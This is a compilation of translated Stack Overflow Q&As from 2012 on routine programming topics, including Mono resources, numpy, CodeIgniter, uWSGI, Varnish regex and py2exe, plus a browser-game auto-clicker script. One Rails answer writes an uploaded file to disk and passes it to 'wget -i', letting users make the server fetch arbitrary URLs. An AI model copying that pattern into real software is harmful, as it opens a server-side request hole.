height=5><br><script>idir='i/w/';fdir='i/w/'; loadtop='sc;0;i.cfm;1;12;-999999999999;1149205838665;19979962050;0;Eli';</script><script src="i/w/j_fr_low.js"></script> <script>lowresbar('0;class=res;; class=res><a href=i.cfm?r' + Math.round(Math.random() * 1000000) + '&f=sc_event>;0;');</script><font class=ft>Research > Housing</font><br>&nbsp;<Br><table width=250 class=trane><tr class=tranbox2><td align=center><table border=0><tr><td class=cw>2,304 turns left in research !</td></tr></table></td></tr></table>&nbsp;<br><table cellspacing=0 cellpadding=2 border=0 align=center class=tranbox><tr class=tranbox2><td class=fs> &nbsp; 31 turn(s) used &nbsp; &nbsp; &nbsp;
Credit -188,302,058,116 &nbsp; Food +17,678,556 &nbsp; &nbsp; <font class=cr>Debt - 18,137,549,878</font>
<br><font class=fsr> &nbsp; Bankruptcy warning: Most production has stopped due to debt<br> &nbsp; Reduce your debt as soon as possible !</font></td></tr></table><img src=i/w/sp_.gif height=5><br>&nbsp;<br>
<script src="i/w/j_sc_research2.js"></script>
<script>
function x5n6z3(obj) { if(obj.value == "Start") obj.form.submit(); obj.value = "Wait!"; } function confirmflag() { if (confirm("")) document.location=frf+'?'+ranurl+'f=sc_research2&rtype='+rtype+'&del=1'; else return false; } 

res2('0;1;&kq7e&;Housing;157;2304;0;Start;Wait!;x5n6z3;y61lip;');
</script>
    <br>&nbsp;</td></tr></table></td><td class=fs> <script>ochat('');</script><font color=#747474>08:27 AM &nbsp; 24 Nov 2012<br>46 Player(s) Online<br>  0.05x Load (sec)</td></td></tr></table> <br><br></body></html> 
```

我想每 4-5 分钟点击一次“开始”按钮。有人能帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:21:48.933

要模拟 JavaScript 中的点击，您可以像我在[这个](https://stackoverflow.com/a/13409470/1615483)答案中所说的那样编写代码。

```
function simulateClick(node) {
    var ev = document.createEvent("MouseEvents");
    ev.initMouseEvent("click", true, false, self, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
    return node.dispatchEvent(ev);
} 
```

并将其与[`window.setInterval`](https://developer.mozilla.org/en-US/docs/DOM/window.setInterval)

```
var nodeToClick = null, // some node
    clicker = function clicker() {
        simulateClick(nodeToClick);
    };
window.setInterval(clicker, 4*60*1000); // 1000ms in sec * 60secs in min * 4 mins 
```

# macos - 在单声道资源访问错误上运行 ASP.NET

> ID：13537357
> 
> 赞同：3
> 
> 时间：2012-11-24T00:58:24.447
> 
> 标签：macos, mono, monodevelop, asp.net-4.0

***解决方案摘要***：核心问题是我的 resx 文件位于 App_LocalResources 和 App_GlobalResources 的子文件夹中。在 .NET 上将内容分离到文件夹中很好，但 Mono 只查看这些文件夹中的文件，而忽略任何子文件夹。

问题 #2 仅在运行时有效。换句话说，资源命名空间可以在 aspx 或页面脚本块的代码中使用，但不能在后面的代码中使用。似乎我从来没有在代码隐藏中使用过 Resources 命名空间，所以我的所有 3 个问题都得到了解决。

* * *

我有一个 ASP.NET 应用程序，我以前在 PC 上的 .NET 上工作，现在正试图转移到 Mac 上使用 Mono 和 MonoDevelop 进行开发。该应用程序利用 App_GlobalResources 和 App_LocalResources 文件夹。该应用程序在 .NET 上运行，但在 Mono 上无法正常运行，正如我将概述的那样。版本信息如下：

操作系统：Mac OS 10.8.2 Mono：2.10.9 ASP.NET：4.0.30319.1 MonoDevelop：3.0.5

我已经用 MonoDevelop 标记了它，因为我不确定正在使用什么服务器以及它是 MonoDevelop 的一部分还是 Mono 本身还是单独的。我对 Mono 还不够熟悉，它的组成部分......

我遇到的问题围绕着访问资源，我遇到了各种相关的问题，我将在下面概述：

**问题 1：meta:resourcekey 不起作用并且“在指定的虚拟路径中找不到资源对象”。错误**

我在应用程序的根目录以及需要页面本地化的子文件夹中都有 App_LocalResources 文件夹和 resx 文件。页面上具有 meta:resourcekey 属性的元素没有为 resx 文件中的相关属性分配值。

例如，我有： /Site/Home.aspx 和 /Site/App_LocalResources/Home 文件夹，其中包含 home.aspx.resx 和相关翻译

注意，当我写这篇文章时，我意识到名称与文件大小写不匹配，但这不是问题，我已经在同一文件夹中的另一个页面上进行了测试，它不会呈现资源值。

有问题的页面后面没有代码。

应用程序根目录中名为 PageNotFound.aspx 的不同页面在 /App_LocalResources/PageNotFound/PageNotFound.aspx.resx 中有相关的 resx 文件

这个页面内容基本如下（如果我去掉两个页面渲染）

```
<h2><asp:Literal runat="server" meta:resourcekey="PageNotFound" /></h2>
<% string message = GetLocalResourceObject("Sorry.Template").ToString(); %> 
```

无论我删除这些行中的第一行还是第二行，我都会得到相同的错误。错误开始：

```
System.Resources.MissingManifestResourceException: A resource object was not 
found at the specified virtualPath at
System.Web.Compilation.DefaultResourceProvider.GetLocalResourcesAssembly 
```

如果我删除第一行实际上是构建并尝试呈现页面但崩溃并给出上述错误。

如果我删除第二行，我也会收到错误，但这是在解析页面并且运行时正在尝试构建页面类时。

因此，对于一个页面似乎使用 meta:resourcekey 属性构建和运行，但没有将资源值绑定到底层控件的属性，在另一个页面上，它似乎在尝试访问资源时崩溃。奇怪的是，崩溃的页面是一个非常简单的页面，没有母版页，它基本上只有上述内容，另一个页面相当复杂，有一个母版页，它呈现（即没有解析器错误）但没有 resourcekey 值分配……

我能看到的唯一区别是一个页面在根目录中并且没有母版页，另一个在子文件夹中并且有母版页？去搞清楚！有任何想法吗？

**问题 2：资源命名空间不存在**

如果我访问使用 .NET 中可用的“资源”命名空间的页面，我会收到运行时编译错误，就像编译时应用程序构建一样，但是当页面被解析和编译时，它会导致（运行时）异常。 ..

```
Compilation Error: CS0103: The name 'Resources' does not exist in the current context 
```

代码将在后面的代码中：（***编辑***：我认为以下行是我在测试，我的代码从不在代码后面（编译时）类中使用此命名空间。一旦全局资源运行，命名空间在运行时工作，但不是在问题顶部的摘要中概述的需要在编译时验证命名空间的情况下）

```
msg.Subject = Resources.EmailResources.Request_SubjectLine 
```

或在 aspx 本身的脚本块中，即

```
<%= Resources.EmailResources.Request_SubjectLine %> 
```

对 Resources 命名空间的这些类型的访问都不起作用。为什么这在 Mono 中不起作用。Mono 框架不会像 .NET 那样为我们生成这些东西吗？（我相当肯定这个命名空间层次结构是由 .NET 上的 ASP.NET 框架生成的，因此想知道这是否还没有在 Mono 中实现？）

**问题 3：GetGlobalResourceObject(...) 调用返回 Null**

在代码隐藏中，我调用了在 .NET 上运行的 GetGlobalResourceObject()，但是当我在 Mono 上运行它时，我的代码抛出了异常。例如：

```
hlContact.Text = GetGlobalResourceObject("CommonResources", "Contact").ToString(); 
```

我的文件夹结构是：App_GlobalResources > CommonResources > CommonResources.resx 并且设计器文件 (CommonResources.Designer.cs) 在那里。

resx 文件都标有“EmbeddedResource”的构建操作，“请勿复制”使用自定义工具“GlobalResourceProxyGenerator”，并具有对每个文件有意义的资源 ID。（即.App_GlobalResources.CommonResources）

问题是 GetGlobalResourceObject() 返回 null ......它没有找到 CommonResources 资源......

请注意，Mono 正在使用 resx 文件的文件夹中构建“*.resource”文件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T04:02:18.503

**问题 #1**

显然 mono 不会在子目录中搜索资源，也就是说，您必须将它们直接保存在`App_LocalResources`or中`App_GlobalResources`。请参阅[单声道源代码中的相关部分](https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web.Compilation/AppResourceFilesCollection.cs#L134)（第 134 行）。如果搜索子目录是官方功能，那么这是一个错误，可以通过更改上述行轻松修复。

* * *

**问题 #2**

在这里工作正常（在linux上）。

* * *

**问题 #3**

我不知道您是如何嵌入资源的，一个小型测试项目会有所帮助。对于`App_GlobalResources`框架在运行时编译它们，然后`GetGlobalResourceObject`也可以正常工作。

# ruby-on-rails - 在 Rails 中使用上传的文件

> ID：13537359
> 
> 赞同：0
> 
> 时间：2012-11-24T00:58:35.227
> 
> 标签：ruby-on-rails, ruby, file, upload

我允许用户在 Rails 中将文件上传到我的网站

```
<div id="file_upload">
  <input type="file" name="user_file">
</div> 
```

现在，在控制器中，我想将此文件传递给 Ruby[系统调用](http://www.ruby-doc.org/core-1.9.3/Kernel.html#method-i-system)。我想要的命令是

```
system("wget", "-i", **filename**) 
```

应该用什么代替`**filename**`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:26:07.377

假设您比评论中提到的其他选项更喜欢这个，您可以做这样的事情。

```
File.open("tmp/filename.ext", "w") do |f|
 f.write(params[:file].read)
end

system("wget", "-i", "tmp/filename.ext") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T02:06:18.777

首先，您需要确保您的表单标签具有 enctype="multipart/form-data" - 否则它将无法工作。

在控制器中，您可以访问类似这样的文件

```
@filename = params[:user_file].original_filename
@file_data = params[:user_file].read 
```

# python - Python - 将numpy数组拆分为大小不等的部分

> ID：13537361
> 
> 赞同：0
> 
> 时间：2012-11-24T00:58:42.627
> 
> 标签：python, arrays, numpy

我试图沿着某一行打破一个 numpy 数组，以便最终得到一个“顶部”和一个“底部”。

例子

```
[[2 1 3 2]   
 [1 6 7 2]
 [2 8 6 3]
 [3 4 2 2]]

top = [2 1 3 2]   

bottom = [[1 6 7 2]
          [2 8 6 3]
          [3 4 2 2]] 
```

实现这一目标的最简单方法是什么？现在我正在复制原始数组两次并删除我不需要的部分。似乎应该有一种简单的方法将数组拆分为大小不等的部分。split 和 vsplit 似乎只分成大小相等的块。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:03:26.700

```
top=data[0]
bottom=data[1:3] 
```

基本上，按照现在的设置，对数据进行切片很容易。如果需要，您可以使用类似的逻辑轻松更改切片点。

# c - 用于理解指针算法的 OpenCV 视觉对象

> ID：13537363
> 
> 赞同：0
> 
> 时间：2012-11-24T00:58:54.717
> 
> 标签：c, pointers, opencv, pointer-arithmetic

我只是在学习 OpenCV。我正在阅读的书建议，对于需要触摸每个像素的操作，我使用带有指针算术、stepWidth 等的双 for 循环从一个到下一个。

我很难准确地想象 IplImage 在内存中的样子，是 RGBRGB 还是 RRRGGGBBB，这些都是数字吗，如果有 8 位图像……等等，它们是否会打包成更大的 32 位？

有谁知道视觉或可以解释分配 OpenCV 图像的基本方式以及哪些数据类型去哪里？我意识到它取决于像素还是平面等，但是如果能直观地看到一些用字节数拼写出来的示例，以便能够更好地理解如何迭代，那就太酷了

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:11:26.460

内部格式为 3x8 字节，按 BGR 顺序每个像素一个。

第0行：BGR（column0）BGR（column1）.......

如果图像的宽度 * 3bytes 不是 4 的倍数，则图像的下一行将从下一个 4byte 边界开始。这是因为在大多数现代机器上，内存访问通常在 32 位边界上更快

请参阅[提取单个像素数据的最快方法？](https://stackoverflow.com/questions/8963617/opencv-fastest-way-to-extract-individual-pixel-data/8963744#8963744)

# php - CodeIgniter2 -- 处理 2 个表关系

> ID：13537370
> 
> 赞同：0
> 
> 时间：2012-11-24T01:02:15.230
> 
> 标签：php, codeigniter-2

CodeIgniter 和 MVC/OOP 也是新手。我目前正在尝试解决的问题涉及 2 张桌子。

* * *

**画廊表**

ID

姓名

客户ID

* * *

**客户表**

ID

姓名

* * *

图库['clientID'] 引用了客户端['id']，因此我可以检索名称。目前我的 gallery_model.php 文件看起来像

```
class Gallery_model extends CI_Model
    {

        public function __construct()
        {
            $this->load->database();
        }

    //Get all in progress galleries from client
    public function get_progress($id = FALSE , $clientRef = '205')
    {
        if($id == FALSE) {
            $query = $this->db->get_where('gallery', array('clientRef' => $clientRef, 'finish' => '0' ));
            return $query->result_array();
        }
    }
    //Get all proofed galleries from client
    public function get_proofed($id = FALSE , $clientRef = '205')
    {
        //get all galleries from client
        if ($id == FALSE) {
            $query = $this->db->get_where('gallery',array('clientRef' => $clientRef, 'finish' => '1'));
            return $query->result_array();
        }
    }

    //get the gallery selected
    public function get_gallery($id , $clientRef = '205')
    {
        //This returns individual galleries
        $query = $this->db->get_where('gallery', array('id' => $id));
        return $query->row_array();
    }
} 
```

**我的控制器看起来像：**

```
 public function index()
    {
        //Proofed Albums
        $data['gallery'] = $this->gallery_model->get_proofed();
        //Albums that are in progress
        $data['in_progress'] = $this->gallery_model->get_progress();

        $this->load->view('templates/header',$data);
        $this->load->view('gallery/index',$data);
        $this->load->view('templates/footer');
    } 
```

然后视图的输出是

```
$gallery['name'] - $gallery['clientId'] 
```

像这样的最佳实践是什么。我知道这可能很简单，但我想开始正确地做这件事。我应该使用`$this->db->join();`

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:24:10.807

跟进[威廉的回答](https://stackoverflow.com/a/13537439/315828)，您可以使用 CI 的 Active Record 进行加入

```
$this->db->from('gallery')->join('client', 'gallery.id = client.id')->get() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T01:20:26.907

使用`$this->db->join()`确实是在一个查询中从多个表中获取信息的最佳方式（也是通过 Active Records 完成而不添加您自己的 SQL 的唯一方式）。

您可能已经意识到这一点，但为了以防万一（并且为了将来访问此页面的人的利益），[CodeIgniter 用户指南](http://codeigniter.com/user_guide/database/active_record.html)有一个很好的页面详细说明了如何使用 Active Records。

Inner Join 的默认值应该适合您的目的。如果您有没有客户链接的图库条目，并且您希望它们包含在结果中，那么您可能需要考虑其他类型的连接，您可以[在此处阅读](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html)。

# google-chrome - 浏览器中文本文件的显示错误

> ID：13537371
> 
> 赞同：4
> 
> 时间：2012-11-24T01:02:16.960
> 
> 标签：google-chrome, vim, encoding, utf-8, text-files

看来，我在文件编码方面遇到了麻烦。它是在 CentOS 服务器上使用 vim 通过 SSH 创建的文本文件。在浏览器中查看文件时，文件的编码存在问题。

我创建了一个测试文件，它解释了这种行为：

res.tobscore.com/test.txt

这就是我希望输出的样子（这只是一个使用特殊字符正确显示变音符号的 html 文件）：

res.tobscore.com/test.html

在终端中使用命令文件和 cat 显示以下输出：

```
user>file test.txt 
test.txt: UTF-8 Unicode English text
user>cat test.txt 
This is a testfile. I'm using the German Umlaute and the euro sign, to test
the encoding.
Euro - €
Scharfes S - ß
Ae - Ä
Oe - Ö
Ue - Ü 
```

如您所见，它是 utf-8 unicode 并且显示正确。您有什么建议，为什么我的浏览器（Firefox 和 Chrome）无法显示它？使用我的平板电脑（用德语设置）使用本机浏览器检查它显示了正确的结果，但用 Chrome 尝试它显示了同样可怕/错误的输出。有没有办法设置编码，所以在每个环境中显示它都会呈现相同的输出？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T01:26:11.670

您的服务器很可能会将 .txt 文件作为**Content-Type: text/plain**发送，但没有字符集。因此，浏览器必须选择一些东西（很可能是 ASCII、iso-8859-1 或 iso-8859-15）并将 UTF-8 字节显示为垃圾。

一种解决方法是将您的文本文件包装在一个小的 PHP 脚本中，并使用它发送正确的编码：

```
<?php 
header ('Content-Type: text/plain; charset=utf-8');
readfile ('test.txt');
?> 
```

readfile() 会将*test.txt*的内容原封不动地转储到您的浏览器。

请注意，这是根据扩展名 (.txt) 选择 Content-Type 的网络服务器；您可能可以更改它，但您必须深入研究配置文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T18:31:23.313

对于 UTF-8 文本，浏览器很难确定使用的编码，并且可能默认为系统的编码。用户将不得不手动更改编码（例如，在 Firefox 中，*查看 > 字符编码 > Unicode (UTF-8)* - 这不是一个非常可行的解决方案）。

解决此问题的一种方法是配置 Web 服务器以发送带有正确`Content-Type: text/plain; charset=utf-8`元数据的文本（或通过 PHP，如 JvO 所建议的那样）。

或者，您可以尝试以更易于检测的编码重新编码文本文件，例如带有 BOM（*字节顺序标记*）的 UTF-16。在 Vim 中，通过以下方式保存文件：

```
 :setlocal bomb
 :w ++enc=utf16-le 
```

# python - 在 uwsgi 上切换 python 版本

> ID：13537373
> 
> 赞同：5
> 
> 时间：2012-11-24T01:02:58.820
> 
> 标签：python, nginx, mod-wsgi, uwsgi

我正在使用 nginx 和 uwsgi 运行 django 应用程序。它工作正常，但突然间我不知道我改变了什么应用程序停止工作。

问题在于 uWsgi 的 python 版本是 2.4.3，这是 Linux CentOs 中的默认版本，我在 2.7.3 版本中安装了 django、webpy 和其他 python 发行版（将尽快升级）

我还尝试在 usr/bin 中创建从 python 2.7 路径到“python”的符号链接，但没有成功。

如何让 uWsgi 使用 python2.7.3(/usr/local/bin/) 而不是 2.4.3？

Django ini：

```
socket = 127.0.0.1:3031
master = true
processes = 4
env = DJANGO_SETTINGS_MODULE=djtest.settings
module = django.core.handlers.wsgi:WSGIHandler() 
```

当我初始化

```
./uwsgi --ini django.ini
[uWSGI] getting INI configuration from django.ini
*** Starting uWSGI 1.3 (64bit) on [Sat Nov 24 00:27:55 2012] ***
compiled with version: 4.1.2 20080704 (Red Hat 4.1.2-52) on 23 November 2012 22:37:39
os: Linux-2.6.18-194.17.4.el5xen #1 SMP Mon Oct 25 16:36:31 EDT 2010
nodename: v238545.hostingator.net
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /root
detected binary path: /opt/uwsgi/uwsgi
your processes number limit is 32832
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
uWSGI http bound on :8000 fd 4
spawned uWSGI http 1 (pid: 5841)
uwsgi socket 0 bound to TCP address 127.0.0.1:59395 (port auto-assigned) fd 3
Python version: 2.4.3 (#1, Jun 18 2012, 08:55:23)  [GCC 4.1.2 20080704 (Red Hat 4.1.2-52)]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x1cc1130
your server socket listen backlog is limited to 100 connections
mapped 72352 bytes (70 KB) for 1 cores
*** Operational MODE: single process ***
added /usr/local/bin/ to pythonpath.
added /home/indaxone/serv/ to pythonpath.
ImportError: No module named django.core.handlers.wsgi
unable to load app 0 (mountpoint='') (callable not found or import error)
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 5840, cores: 1) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-24T01:18:19.980

在 uwsgi 安装期间执行“make”之前，我执行了以下操作：

```
python2.7 uwsgiconfig.py --build 
```

# regex - 正则表达式匹配任何不是子模式的东西

> ID：13537377
> 
> 赞同：0
> 
> 时间：2012-11-24T01:03:33.250
> 
> 标签：regex, varnish, varnish-vcl

我的 HTTP 标头中有 cookie，如下所示：

```
Set-Cookie: frontend=ovsu0p8khivgvp29samlago1q0; adminhtml=6df3s767g199d7mmk49dgni4t7; external_no_cache=1; ZDEDebuggerPresent=php,phtml,php3 
```

我需要提取前端之后的 26 个字符串（例如`ovsu0p8khivgvp29samlago1q0`）。以下正则表达式与我匹配：

```
(?<=frontend=)(.*)(?=;) 
```

但是，我使用的是清漆缓存，只能使用正则表达式替换。因此，要提取该 cookie 值（26 个`frontend`字符串），我需要匹配与该模式不匹配的所有字符（因此我可以将它们替换为`''`）。

我已经做了相当多的谷歌搜索，但到目前为止还一片空白。我试过以下

*   匹配与我想要的模式不匹配的字符：`[^((?<=frontend=)[A-Za-z0-9]{26}(?=;))]`匹配随机字符，包括我想要保留的字符

如果有人能指出我正确的方向，或者指出我可能出错的地方，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T20:48:35.980

Set-Cookie 响应头在 Varnish 中有点神奇，因为后端倾向于发送多个具有相同名称的头。这是 RFC 禁止的，但实际上是这样做的。

如果您使用的是 Varnish 3.0，您可以使用 Header VMOD，它可以解析响应并提取您需要的内容：

[https://github.com/varnish/libvmod-header](https://github.com/varnish/libvmod-header)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T01:09:59.923

使用正则表达式模式

```
^Set-Cookie:.*?\bfrontend=([^;]*) 
```

并且*“前端之后的 26 个字符串”*将成组`1`（通常在替换字符串中称为`$1`）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T01:13:15.343

您可以控制替换字符串吗？如果是这样，您可以使用 Ωmega 的答案，并`$1`在替换字符串中使用将`frontend`值写回。

否则，你可以使用这个：

```
^Set-Cookie:.*(?!frontend=)|(?<=frontend=.{26}).*$ 
```

这将匹配从字符串开头到`frontend=`遇到的所有内容。或者它将匹配`frontend=`左侧正好有 26 个字符的所有内容，直到字符串末尾。如果这 26 个字符是可变长度的，那么它会变得更加复杂，因为只有 .NET 支持可变长度的后视。

对于你的最后一个问题。让我们看看你的正则表达式：

```
[^((?<=frontend=)[A-Za-z0-9]{26}(?=;))] 
```

好吧，首先，`[^...]`你试图用它来包围你的否定字符类，实际上并不是这样工作的。它仍然是一个字符类，因此它只匹配不在该类中的单个字符。但它变得更加复杂（我想知道为什么它完全匹配）。所以首先字符类应该由**first** `]`关闭。此字符类匹配任何不是`(`, `?`, `<`, `=`, `)`, 字母或数字的字符。然后将`{26}`应用于那个，所以我们试图找到其中的 26 个字符。然后`(?=;)`which 断言这 26 个字符后面跟着`;`. 现在是什么不应该工作。关闭`)`实际上应该抛出和错误。和决赛`]`将被解释为文字`]`。

有一些正则表达式允许嵌套字符类（Java 可以）。在这种情况下，您只需拥有一个等同于`[^a-zA-Z0-9(){}?<=;]`. 但据我所知，Varnish 使用 PCRE，而在 PCRE 中，您的正则表达式根本不应该编译。

# python - Py2Exe 和 Easgui

> ID：13537379
> 
> 赞同：1
> 
> 时间：2012-11-24T01:04:42.670
> 
> 标签：python, module, py2exe, easygui

我正在尝试将 py 文件转换为 exe。这是我的安装文件的代码

```
from distutils.core import setup
import py2exe
setup(console=["mycode.py"]) 
```

当我使用 cmd 时，它说： Import Error: No module named easygui

如何让 py2exe 知道 easygui？以及 numpy 和 mathplotlib（都在 mycode.py 中使用）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:13:36.703

首先，使用[pyinstaller](http://www.pyinstaller.org/)。它更新更好（尽管在切换到 pyinstaller 之前我一直使用 py2exe）而且它似乎有更好的方法来查找包含的库。

但是对于 py2exe，您需要进一步扩展 setup.py 以告诉它要包含的内容（因为它们可能是隐藏的导入）

```
setup(
    console=["mycode.py"],
    options={
        "py2exe": {
            "includes": ["easygui"],
            "bundle_files": 1
        },
    },
    zipfile = None,
) 
```

如果这无法构建，`easygui`则不在您的 PYTHONPATH 中。确保你没有在你的脚本中做一些特殊的事情来添加一个 pythonpath，这对 py2exe 是不可见的。

对于 numpy 和 matplotlib，您可能需要对这个文件做更多的工作。请参阅[此 wiki 以获取帮助](http://www.py2exe.org/index.cgi/WorkingWithVariousPackagesAndModules)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-17T15:53:17.477

相对于提到的特定 dll 的问题，我遇到了类似的问题，但通过专门排除设置中的问题来解决这些问题：

```
setup(
    console=['DET14.py'],
    options={
             'py2exe': {
                        'packages' : ['matplotlib', 'pytz'],
                        'dll_excludes':['MSVCP90.DLL',
                                        'libgdk-win32-2.0-0.dll',
                                        'libgobject-2.0-0.dll',
                                        'libgdk_pixbuf-2.0-0.dll'],
                        'includes':['scipy.sparse.csgraph._validation',
                            'scipy.special._ufuncs_cxx']
                       }
            },
    data_files=matplotlib.get_py2exe_datafiles()
)` 
```

我会说尝试将该排除添加到您的设置语句中。

# android - Android - 重新查询由 RANDOM() 排序的游标

> ID：13537382
> 
> 赞同：0
> 
> 时间：2012-11-24T01:04:55.293
> 
> 标签：android, random, sql-order-by, android-contentprovider, android-cursorloader

这听起来像是一个愚蠢的问题，但我正在努力解决这个问题。我正在开发一个报价应用程序，因此我希望每次启动应用程序时都从数据库中随机订购报价。

我正在使用 CursorLoader 和 ViewPager。我在屏幕上有一些按钮（放入收藏夹按钮），它使用内容解析器更新数据库中的列，该内容解析器在 ContentProvider 中触发 update()。然后更新会导致重新查询以更新所做的更改。都是标准的。

**这当然会导致由于 random() 子句的 order 而给我排序不同的行，**并导致屏幕“消失”。

*知道如何解决这个问题吗？我真的很想保留随机排序功能。*

```
class MyContentProvider extends ContentProvider {
@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    Cursor cursor = db.query(TABLE_NAME, projection, selection, selectionArgs, null, null, sortOrder);
    cursor.setNotificationUri(resolver, uri);
    return cursor;
}

@Override
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
    int count = db.update(TABLE_NAME, values, selection, selectionArgs);
    resolver.notifyChange(uri, null);
    return count;
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-14T03:14:43.857

你可以使用类似的东西

```
Cursor c = db.rawQuery("select * from table ORDER BY RANDOM()"); 
```

[SQLite 文档](http://www.sqlite.org/lang_corefunc.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T15:51:50.163

正如 zapl 建议的那样，我最终做的是添加一列。它将保存 myOrder，它将在 onCreate 中填充随机值，然后只需使用 myOrder 的 order 进行 Select

# iphone - 在 NSArray 中设置值

> ID：13537388
> 
> 赞同：0
> 
> 时间：2012-11-24T01:06:39.413
> 
> 标签：iphone, objective-c, arrays, nsmutablearray, nsarray

环顾了一会儿，找不到答案，但这似乎是一件很简单的事情。我想创建一个 NSArray，它有 100 个对象（门）的空间，然后循环遍历为数组中的每个索引创建一个新门。当我初始化 NSArray 时，如果不手动为 100 个新门编写代码，我就找不到办法做到这一点。我知道我可以通过创建一个 NSMutableArray 并使用 addObject 来做到这一点，但我听说 NSArrays 更快，我想知道如何做到这一点以供将来参考。

这就是我基本上想要做的事情：

```
NSArray *doors = [[NSArray alloc]init]; //with size 100?
for (int i = 0; i < [doors count]; i++)
    [[doors objectAtIndex:i] = [[Door alloc]init]]; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T01:15:00.733

如果您要将对象添加到循环内的数组中，那么 NSMutableArray 是要使用的正确对象。

创建 100 个门：

```
NSMutableArray *doors = [NSMutableArray new];
for (int i=0; i < 100; i++){
    [doors addObject:[[Door alloc]init]];
} 
```

现在你有一个包含 100 个门对象的可变数组。如果以后不需要修改数组，可以将其转换回不可变数组进行处理，如下所示：

```
NSArray *newDoorList = [NSArray arrayWithArray:doors]; 
```

可变数组和非可变数组之间可能存在一些较小的性能影响，但您不会注意到它们只有几百个对象 - 至少这是我的经验。

希望有帮助。祝你好运。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T01:11:41.497

创建一个 NSMutableArray，然后使用 [array copy] 获取一个不可变的 NSArray。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T01:13:26.573

有关某些选项，请参阅此答案，基本上是创建一个 NSMutable 数组并使用它来创建您的 NSArray ...

[http://www.cocoabuilder.com/archive/cocoa/190315-nsmutablearray-to-nsarray.html#190321](http://www.cocoabuilder.com/archive/cocoa/190315-nsmutablearray-to-nsarray.html#190321)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-24T01:14:50.023

NSMutableArray 是一个动态数组，不需要预先定义大小。正如 Aleph 建议的那样，使用 NSMutableArray 并将您的门对象附加 100 倍。像这样：

```
 NSMutableArray *myArray = [NSMutableArray arrayWithCapacity:100];

 for ( int i = 0; i < 100; i++ ) {

      [myArray addObject: [[Door alloc] init]];
 }

 NSArray *filledArray = [NSArray arrayWithArray:myArray]; 
```

刚刚编辑以包含 arrayWithCapacity: 方法。根据这个 SO 线程，如果您知道所需的*确切* 数字，它应该一次分配所有内存。除此之外， NSArray 与 NSMutableArray 在速度方面不会表现出太大的差异。（直到被证明是错误的。O_o）

[使用 NSMutableArray 与 NSArray 的缺点？](https://stackoverflow.com/questions/1746204/disadvantage-of-using-nsmutablearray-vs-nsarray)

# asp.net-mvc-3 - 从 ActionParameters 检索复杂对象

> ID：13537389
> 
> 赞同：7
> 
> 时间：2012-11-24T01:06:50.430
> 
> 标签：asp.net-mvc-3, action-filter

我正在开发一个 MVC 项目，其中控制器操作处理资产。不同的控制器以不同的方式获取assetId 参数：一些控制器简单地获取`int assetId`、其他`int id`和其他使用复杂对象`AssetDTO dto`（其中包含保存assetId 的属性）

我正在编写一个 ActionFilter，它被添加到 action 方法中，并提供了 actionParameter 名称，我可以在其中获取资产值。

行动方法：

```
 [AssetIdFilter("assetId")]
    public ActionResult Index(int assetId)
    {
            ...
    } 
```

该属性定义为：

```
public class AssetIdFilterAttribute : ActionFilterAttribute
{
    public string _assetIdParameterKey { get; set; }

    public AssetIdFilterAttribute (string assetIdParameterKey)
    {
        _assetIdParameterKey = assetIdParameterKey;
    }

    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        int assetId;
        if (Int32.TryParse(filterContext.ActionParameters[_assetIdParameterKey].ToString(), out assetId))
        {
                    ......
        }
    } 
```

这可以按预期工作，但仅当assetId 作为原语提供时才有效。我不确定在将复杂对象中的assetId 提供给操作方法时该怎么做。

我需要根据类型对每个对象进行不同的解析吗？我希望我可以在 AssetIdFilter 中指定某种点符号来告诉它assetId 的位置：dto.assetId

有什么办法可以使用动态？还是反思？？等等？？？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-24T06:10:19.533

and here **dynamic** comes to the rescue.you can change the actionFilterAttribute to be :

```
 public override void OnActionExecuting(ActionExecutingContext filterContext)
        {
            dynamic assetIdHolder = filterContext.ActionParameters[_assetIdParameterKey];
            if (assetIdHolder.GetType().IsPrimitive)
            {
                //do whatever with assetIdHolder              
            }
            else
            {
                //do whatever with assetIdHolder.assetId
            }
        } 
```

cheers!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T18:10:48.573

嗯，是的，你回答了你的问题。一种方法是使用点表示法：

```
//simple case:
[AssetId("id")]
public ActionResult Index(string id) {
    //code here
}

//complex case:
